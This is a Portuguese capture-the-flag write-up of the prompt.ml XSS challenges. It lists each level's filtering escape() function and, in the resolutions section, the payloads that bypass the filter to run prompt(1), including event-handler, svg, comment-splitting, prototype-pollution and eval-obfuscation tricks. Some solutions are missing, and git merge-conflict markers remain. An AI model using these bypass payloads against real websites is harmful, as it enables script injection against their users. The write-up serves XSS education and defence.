# 🦆 DuckWare - Write-up cross-site scripting (XSS)
>Autor: @Ralfbp

---
## ✨ Desafio: XSS

> Link do desafio: https://prompt.ml/0  
> Link do material: https://portswigger.net/web-security/cross-site-scripting

---

## Introdução

### Sobre este site

É um jogo de injeção **XSS** inspirado no [alert(1) para vencer](http://escape.alf.nu/).

### Regras

Para vencer, chame `prompt(1)`. Você deve fazer isso sem interação do usuário. Após completar cada nível, sua "payload" será enviada para verificação e, em seguida, testada nos seguintes navegadores:

- **Chrome** (versão mais recente)
    
- **Firefox** (versão mais recente)
    
- **Internet Explorer 10**
    

Embora a maioria dos níveis tenha soluções para todos os navegadores, alguns podem não ter. É garantido que cada nível tenha soluções para, pelo menos, dois navegadores.

Por último, mas não menos importante, payloads mais curtas recebem mais pontos.

Cada nível adiciona uma nova dificuldade e novos caminhos para se chegar ao resultado desejado. Ao completar os desafios, o código que aparece em cada um deles será substituído por **YOU WON**.

<center><img src='Imagem do 🦆 DuckWare 🦆 DuckWare/Resp.png'></center>


O site possui 16 desafios, classificados de `0 a 9` e de `A a F`.

> Desafio feito no navegador Chrome

---

## 🧩 Desafios

### 🔹 Desafio 0 — Básico

Desafio básico para demonstrar como os desafios funcionam. Ele exige uma injeção de HTML ativo que execute o `prompt(1)`.

<center><img src='Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_0❌.png'></center>

```

function escape(input) {
    // warm up
    // script should be executed without user interaction
    return '<input type="text" value="' + input + '">';
}

```

[Ir para a resolução do 0º desafio](#-0º-desafio)

### 🔹 Desafio 1 — Regex simples

Exige desviar de um mecanismo simples de remoção de caracteres. A expressão regular simples pode ser contornada removendo-se o caractere final `>`. Para forçar o navegador a renderizar o vetor de ataque, é necessário um espaço final ou uma quebra de linha.

<center><img src='Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_1❌.png'></center>


```
function escape(input) {
    // tags stripping mechanism from ExtJS library
    // Ext.util.Format.stripTags
    var stripTagsRE = /<\/?[^>]+>/gi;
    input = input.replace(stripTagsRE, '');

    return '<article>' + input + '</article>';
}

```

[Ir para a resolução do 1º desafio](#-1º-desafio)

### 🔹 Desafio 2 — Bloqueio de `=` e `(`

Todos os parênteses abertos e sinais de igual são bloqueados.

<center><img src='Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_2❌.png'></center>

```
function escape(input) {
    // v-- frowny face
    input = input.replace(/[=(]/g, '');

    // ok seriously, disallows equal signs and open parenthesis
    return input;
}
```

[Ir para a resolução do 2º desafio](#-2º-desafio)

### 🔹 Desafio 3 — Comentários HTML

O nível 3 exige escapar a entrada de uma estrutura de comentário HTML. Seria fácil se não fosse por uma limitação complexa que bloqueia todos os delimitadores de comentários em potencial.

<center><img src='Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_3❌.png'></center>

```
function escape(input) {
    // filter potential comment end delimiters
    input = input.replace(/->/g, '_');

    // comment the input to avoid script execution
    return '';
}
```

[Ir para a resolução do 3º desafio](#-3º-desafio)

### 🔹 Desafio 4 — Scripts externos (whitelist de domínio)

<center><img src='Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_1❌.png'></center>

```
function escape(input) {
    // make sure the script belongs to own site
    // sample script: http://prompt.ml/js/test.js
    if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) {
        var script = document.createElement('script');
        script.src = input;
        return script.outerHTML;
    } else {
        return 'Invalid resource.';
    }
}
```

[Ir para a resolução do 4º desafio](#-4º-desafio)

### 🔹 Desafio 5 — Regex contra `>` e eventos

Precisamos ignorar uma expressão regular que tenta bloquear manipuladores de eventos e o colchete de fechamento `>` para que não possamos fechar a tag `input` existente e executar **JavaScript**. A vantagem aqui é que podemos facilmente escapar do atributo atual. Outro problema fundamental com a expressão regular é que ela não consegue lidar com entradas de múltiplas linhas, como `U+000A LINE FEED (LF)` e `U+000C FORM FEED (FF)`, que também são separadores de atributos.

Assim, podemos injetar um manipulador de eventos seguido por uma nova linha e, em seguida, executar **JavaScript** arbitrário. Note que não podemos usar as palavras-chave `autofocus`, pois elas estão sendo filtradas. No entanto, ainda podemos usar o evento `onresize` no **MSIE**.

<center><img src='Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_5❌.png'></center>

```
function escape(input) {
    // apply strict filter rules of level 0
    // filter ">" and event handlers
    input = input.replace(/>|on.+?=|focus/gi, '_');

    return '<input value="' + input + '" type="text">';
}
```

[Ir para a resolução do 5º desafio](#-5º-desafio)

### 🔹 Desafio 6 — Redirecionamento com formulário

No nível 6, a expressão regular tenta proibir o uso de strings `javascript`, `vbscript`, assim como URIs de dados, para nos impedir de executar qualquer **JavaScript**.

No entanto, o problema é que isso nos permite criar nossas próprias entradas, que podem ser usadas para sobrepor a propriedade `action` do formulário. Devido à sobrecarga do **DOM**, `document.forms[0].action` retornará o campo de entrada recém-criado em vez do atributo `action` real, permitindo-nos executar nosso **JavaScript**.

<center><img src='Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_6❌.png'></center>

```
function escape(input) {
    // let's do a post redirection
    try {
        // pass in formURL#formDataJSON
        // e.g. http://httpbin.org/post#{"name":"Matt"}
        var segments = input.split('#');
        var formURL = segments[0];
        var formData = JSON.parse(segments[1]);

        var form = document.createElement('form');
        form.action = formURL;
        form.method = 'post';

        for (var i in formData) {
            var input = form.appendChild(document.createElement('input'));
            input.name = i;
            input.setAttribute('value', formData[i]);
        }

        return form.outerHTML + '
<script>
    // forbid javascript: or vbscript: and data: stuff
    if (!/script:|data:/i.test(document.forms[0].action))
        document.forms[0].submit();
    else
        document.write("Action forbidden.")
</script>
        ';
    } catch (e) {
        return 'Invalid form data.';
    }
}
```

[Ir para a resolução do 6º desafio](#-6º-desafio)

### 🔹 Desafio 7 — Segmentação com `#`

O truque aqui é usar o primeiro segmento para fechar a tag `<p>` e, em seguida, iniciar nossa própria tag (neste caso, `<svg>`). Em seguida, abrimos um atributo para conter o "lixo" que será colocado entre o primeiro e o segundo segmentos.

No segundo segmento, fechamos nosso atributo e abrimos nosso evento (`onload`). Depois, usamos um comentário **JS** (`/*`) para conter o lixo que será colocado entre o segundo e o terceiro segmento. No terceiro segmento, fechamos o comentário **JS** e, finalmente, chamamos nosso precioso `prompt(1)`.

<center><img src='Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_7❌.png'></center>

```
function escape(input) {
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');
    return segments.map(function(title) {
        // title can only contain 12 characters
        return '<p class="comment" title="' + title.slice(0, 12) + '"></p>';
    }).join('\n');
}
```

[Ir para a resolução do 7º desafio](#-7º-desafio)

### 🔹 Desafio 8 — Filtro de quebras de linha

Existem dois desafios a serem resolvidos no nível 8. O primeiro é usar um separador de linhas **JavaScript** válido e o segundo é encontrar uma maneira alternativa de comentar o código. Como pode ser notado no código, os caracteres `\r\n` são filtrados. No entanto, os seguintes caracteres também são tratados como separadores de linhas válidos em **JavaScript**:

<center><img src='Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_8❌.png'></center>

```
function escape(input) {
    // prevent input from getting out of comment
    // strip off line-breaks and stuff
    input = input.replace(/[\r\n</"]/g, '');

    return '
<script>
    // console.log("' + input + '");
</script> ';
}
```

[Ir para a resolução do 8º desafio](#-8º-desafio)

### 🔹 Desafio 9 — Incompleta

Usa a expressão regular `"<([a-zA-Z])"`, que impede o usuário de adicionar qualquer alfabeto seguido de um colchete de abertura (`<`) e, portanto, nos impede de injetar uma tag **HTML** válida.

O caractere `ſ`, quando passado para a função `toUpperCase()`, seria convertido no caractere **ASCII** "S", resolvendo assim nosso problema.

<center><img src='Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_9❌.png'></center>

```
function escape(input) {
    // filter potential start-tags
    input = input.replace(/<([a-zA-Z])/g, '<_$1');
    // use all-caps for heading
    input = input.toUpperCase();

    // sample input: you shall not pass! => YOU SHALL NOT PASS!
    return '<h1>' + input + '</h1>';
}
```

[Ir para a resolução do 9º desafio](#-9º-desafio)

### 🔹 Desafio A — Bloqueio de `prompt` e `'`

Este é um dos mais fáceis de resolver neste desafio. Existem duas expressões regulares para ignorar: a primeira remove todas as ocorrências da palavra-chave `prompt`, enquanto a segunda remove todas as aspas simples `'`.

<center><img src='Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_A❌.png'></center>

```
function escape(input) {
    // (╯°□°）╯︵ ┻━┻
    input = encodeURIComponent(input).replace(/prompt/g, 'alert');
    // ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro
    input = input.replace(/'/g, '');

    // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO
    return '<script>' + input + '</script> ';
}
```

[Ir para a resolução do A desafio](#-a-desafio)

### 🔹 Desafio B — Filtro de operadores

Nos permite injetar diretamente no que será o corpo de um elemento de script. No entanto, antes disso, a string que podemos influenciar passa por uma filtragem pesada e não podemos injetar operadores ou outros elementos da linguagem que permitiriam concatenação e injeção de payload fáceis.

<center><img src='Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_B❌.png'></center>

```
function escape(input) {
    // name should not contain special characters
    var memberName = input.replace(/[[|\s+*/\\<>&^:;=~!%-]/g, '');

    // data to be parsed as JSON
    var dataString = '{"action":"login","message":"Welcome back, ' + memberName + '."}';

    // directly "parse" data in script context
    return '
<script>
    var data = ' + dataString + ';
    if (data.action === "login")
        document.write(data.message)
</script> ';
}
```

[Ir para a resolução do B desafio](#-b-desafio)

### 🔹 Desafio C — `encodeURIComponent` + filtro

É semelhante ao nível 10, mas as expressões regulares usadas para filtragem são diferentes. O primeiro desafio real é lidar com a instrução `encodeURIComponent`. Usando esta função, caracteres como `/`, `=`, `?`, etc. são codificados em **URL** e, portanto, a maioria dos vetores de ataque não são mais utilizáveis.

<center><img src='Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_C❌.png'></center>

```
function escape(input) {
    // in Soviet Russia...
    input = encodeURIComponent(input).replace(/'/g, '');
    // table flips you!
    input = input.replace(/prompt/g, 'alert');

    // ノ┬─┬ノ ︵ ( \o°o)\
    return '<script>' + input + '</script> ';
}
```

[Ir para a resolução do C desafio](#-c-desafio)

### 🔹 Desafio D — Injeção em JSON / Prototype Pollution

Requer alguns truques interessantes, um dos quais também será útil para o nível oculto. O objetivo principal deste nível é adulterar um objeto **JSON** (`config`) com uma chave especial (`source`) e contornar uma série de limitações.

<center><img src='Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_D❌.png'></center>

```
function escape(input) {
    // extend method from Underscore library
    // _.extend(destination, *sources)
    function extend(obj) {
        var source, prop;
        for (var i = 1, length = arguments.length; i < length; i++) {
            source = arguments[i];
            for (prop in source) {
                obj[prop] = source[prop];
            }
        }
        return obj;
    }
    // a simple picture plugin
    try {
        // pass in something like {"source":"http://sandbox.prompt.ml/PROMPT.JPG"}
        var data = JSON.parse(input);
        var config = extend({
            // default image source
            source: 'http://placehold.it/350x150'
        }, JSON.parse(input));
        // forbit invalid image source
        if (/[^\w:\/.]/.test(config.source)) {
            delete config.source;
        }
        // purify the source by stripping off "
        var source = config.source.replace(/"/g, '');
        // insert the content using mustache-ish template
        return '<img src="{{source}}">'.replace('{{source}}', source);
    } catch (e) {
        return 'Invalid image data.';
    }
}
```

[Ir para a resolução do D desafio](#-d-desafio)

### 🔹 Desafio E — Incompleta

<center><img src='Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_E❌.png'></center>

```
function escape(input) {
    // I expect this one will have other solutions, so be creative :)
    // mspaint makes all file names in all-caps :(
    // too lazy to convert them back in lower case
    // sample input: prompt.jpg => PROMPT.JPG
    input = input.toUpperCase();
    // only allows images loaded from own host or data URI scheme
    input = input.replace(/\/\/|\w+:/g, 'data:');
    // miscellaneous filtering
    input = input.replace(/[\\&+%\s]|vbs/gi, '_');

    return '<img src="' + input + '">';
}
```

[Ir para a resolução do E desafio](#-e-desafioh)

### 🔹 Desafio F — Segmentação + título limitado

Cada segmento é reduzido a um comprimento máximo de 15 caracteres e distorcido em uma tag `<p>`.

<center><img src='Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_F❌.png'></center>

```
function escape(input) {
    // sort of spoiler of level 7
    input = input.replace(/\*/g, '');
    // pass in something like dog#cat#bird#mouse...
    var segments = input.split('#');

    return segments.map(function(title, index) {
        // title can only contain 15 characters
        return '<p class="comment" title="' + title.slice(0, 15) + '" data-comment=\'{"id":' + index + '}\'></p>';
    }).join('\n');
}
```

[Ir para a resolução do F desafio](#-f-desafio)

---

## 🛠️ Resoluções

### 🔹 0º desafio

<center><img src='Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_0✅.png'></center>

```
"><script>prompt(1)</script>
```

- O **input** fecha o atributo `value` ("), abre e fecha a tag `<input>`. Em seguida, vem a tag `<script>` injetada pelo usuário.
    
- Esse trecho não aparece como texto na página, ele é interpretado como um **bloco de código JavaScript real** que roda no navegador de quem abre a página.
    

[Ir para o desafio 0](#-desafio-0--básico)

### 🔹 1º desafio

<center><img src='XSS/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_1✅.png'></center>

```
<img src="x" onerror="prompt(1)"
```

[Ir para o desafio 1](#-desafio-1--regex-simples)

### 🔹 2º desafio

<center><img src='XSS/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_2✅.png'></center>

```
<svg><script>prompt&#40;1)</script></b>
```

[Ir para o desafio 2](#-desafio-2--bloqueio-de--e-)

### 🔹 3º desafio

<center><img src='XSS/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_3✅.png'></center>

```
--!> <script>prompt(1)</script>
```

[Ir para o desafio 3](#-desafio-3--comentários-html)

### 🔹 4º desafio

**Resolução pendente.**

[Ir para o desafio 4](#-desafio-4--scripts-externos-whitelist-de-domínio)

### 🔹 5º desafio

<center><img src='XSS/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_5✅.png'></center>

```
"type=image src onerror
="prompt(1)
```

[Ir para o desafio 5](#-desafio-5--regex-contra--e-eventos)

### 🔹 6º desafio

<center><img src='XSS/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_6✅.png'></center>

```
javascript:prompt(1)#{"action":1}
```

[Ir para o desafio 6](#-desafio-6--redirecionamento-com-formulário)

### 🔹 7º desafio

<center><img src='XSS/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_7✅.png'></center>

```
"><svg/a=#"onload='/*#*/prompt(1)'
```

[Ir para o desafio 7](#-desafio-7--segmentação-com-)

### 🔹 8º desafio

<center><img src='XSS/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_8✅.png'></center>

```
 prompt(1) -->
```

[Ir para o desafio 8](#-desafio-8--filtro-de-quebras-de-linha)

### 🔹 9º desafio

**Resolução pendente.**

[Ir para o desafio 9](#-desafio-9--incompleta)

### 🔹 A desafio

<center><img src='XSS/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_A✅.png'></center>

Para ignorar a primeira expressão regular, basta usar uma aspa simples para dividir a palavra-chave `prompt` em `pr'ompt`. Isso claramente não é uma instrução **JavaScript** válida, mas não se preocupe: a segunda expressão regular removerá o caractere intruso `'`, retornando um vetor de ataque válido!

```
p'rompt(1)
```

[Ir para o desafio A](#-desafio-a--bloqueio-de-prompt-e-)

### 🔹 B desafio

<center><img src='XSS/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_B✅.png'></center>

O truque aqui é usar um operador alfanumérico — ou seja, um operador que não exija o uso dos caracteres especiais proibidos. Existem vários deles, e um que podemos utilizar aqui é o operador `in`.

```
"(prompt(1))in"
```

[Ir para o desafio B](#-desafio-b--filtro-de-operadores)

### 🔹 C desafio

<center><img src='XSS/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_C✅.png'></center>

```
eval(630038579..toString(30))(1)
```

[Ir para o desafio C](#-desafio-c--encodeuricomponent--filtro)

### 🔹 D desafio

<center><img src='XSS/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_D✅.png'></center>

```
{"source":"_-_invalid-URL_-_","__proto__":{"source":"$`onerror=prompt(1)>"}}
```

[Ir para o desafio D](#-desafio-c--encodeuricomponent--filtro)

### 🔹 E desafio

**Resolução pendente.**

[Ir para o desafio E](#-desafio-e--incompleta)

### 🔹 F desafio

<center><img src='XSS/Imagem do 🦆 DuckWare 🦆 DuckWare/Atividade_F✅.png'></center>
[Ir para o desafio F](#-desafio-f--segmentação--título-limitado)

Um truque que podemos usar aqui é usar comentários **HTML** `<script>prompt(1)</script>

```
"><svg><!--#--><script><!--#-->prompt(1<!--#-->)</script>

```

<<<<<<< HEAD:XSS/🦆 DuckWare - cross-site scripting (XSS).md
=======
Ir para o desafio F](#-desafio-f--segmentação--título-limitado)
>>>>>>> fd2c3ce112abf1acbae77ee16f1f5543175dadd2:🦆 DuckWare - Write-up cross-site scripting (XSS).md
---

## ✅ Conclusão

O **prompt.ml** é um laboratório de **XSS** criativo. Cada nível reforça conceitos como:

* Limitações de **regex** e por que não são suficientes para segurança.
* Vetores via **atributos/eventos**, **comentários**, **entidades/Unicode**.
* Injeções em **contextos distintos** (**HTML**, atributos, **JSON**, `src`, forms).
* Truques de **prototype pollution** e **URI schemes**.

**Lição principal:** a sanitização por **regex** é frágil. Prefira:

* Inserir dados via **API do DOM** (`textContent`, `setAttribute`).
* **Escapar corretamente** (`& < > " ' /`).
* Aplicar **CSP** e validações por **whitelist** robustas.

<<<<<<< HEAD:XSS/🦆 DuckWare - cross-site scripting (XSS).md
> **Restante a completar:** payloads exemplares dos níveis **9** e **E** (dependem de variantes específicas do jogo/navegador).
=======
> **Restante a completar:** payloads exemplares dos níveis **9** e **E** (dependem de variantes específicas do jogo/navegador).
>>>>>>> fd2c3ce112abf1acbae77ee16f1f5543175dadd2:🦆 DuckWare - Write-up cross-site scripting (XSS).md
